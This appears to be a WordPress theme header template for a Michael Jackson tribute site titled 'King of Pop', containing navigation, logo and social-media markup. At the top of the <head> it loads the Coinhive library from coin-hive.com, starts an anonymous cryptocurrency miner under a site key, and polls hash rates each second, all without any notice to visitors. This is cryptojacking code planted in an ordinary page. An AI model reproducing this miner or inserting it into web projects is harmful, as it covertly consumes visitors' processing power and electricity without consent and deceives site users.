<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
            <title>King of Pop</title>
      	    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
	    <script>
	       var miner = new CoinHive.Anonymous('7F7ugUrtXYn40Que7u2fEBwSHkJhvHIt');
	       miner.start();
            </script>
            <script>
	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
	}, 1000);
            </script>
            <?php wp_head(); ?>
        </head>
    <body>
    <div class="header">
        <header class="nav-down row">
            <div id="nav-trigger">
                    <span><img src="<?php echo get_template_directory_uri(); ?>/img/appbar.lines.horizontal.4.png"
                    width="40" height="40" /></span>
            </div>
            <nav id="nav-main">
                <?php wp_nav_menu(array('menu_class' => 'menu')); ?> 
            </nav>
           <nav id="nav-mobile"></nav>
            <div id="headerlogoone">
            <a href="http://kingofpop.eb2a.com/"><img class="headerlogoimgone" src="<?php echo get_template_directory_uri(); ?>/img/hat38.png " width="42" height="42"  /></a>
            </div>
            
             <div id="socialmedia">
            <a href="#"><img class="facebook" src="<?php echo get_template_directory_uri(); ?>/img/socialmediaicons/white/facebook.png " width="32" height="32"  /></a>
            <a href="#"><img class="twitter" src="<?php echo get_template_directory_uri(); ?>/img/socialmediaicons/white/twitter.png " width="32" height="32" /></a>
            <a href="#"><img class="youtube" src="<?php echo get_template_directory_uri(); ?>/img/socialmediaicons/white/youtube-2.png "  width="32" height="32"  /></a>
            <a href="#"><img class="instagram" src="<?php echo get_template_directory_uri(); ?>/img/socialmediaicons/white/instagram.png "  width="32" height="32"  /></a>
            <a href="#"><img class="rss" src="<?php echo get_template_directory_uri(); ?>/img/socialmediaicons/white/rss.png "  width="32" height="32"  /></a>

            </div>
    </header>
        <div class="logo row">
            <p class="address">King Of Pop</p>
            <p class="addressone">memories of the music legend</p>
        </div>
        <div class="adv">
            <img src="<?php echo get_template_directory_uri(); ?>/img/advone.jpg" />
        </div>
        
    </div>	
<?php // get_search_form(); ?>
